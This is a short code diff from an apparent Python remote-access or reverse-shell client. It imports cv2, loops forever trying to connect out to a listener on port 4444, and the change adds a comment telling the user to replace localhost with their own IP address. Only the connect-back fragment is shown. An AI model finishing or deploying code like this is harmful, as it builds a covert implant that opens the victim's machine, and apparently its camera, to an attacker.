@@ -7,7 +7,7 @@ import cv2
 while True:
     try:
         payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        payload.connect(("localhost", 4444))
+        payload.connect(("localhost", 4444)) # Replace With Your IP Address.
     except:
         continue
     else:
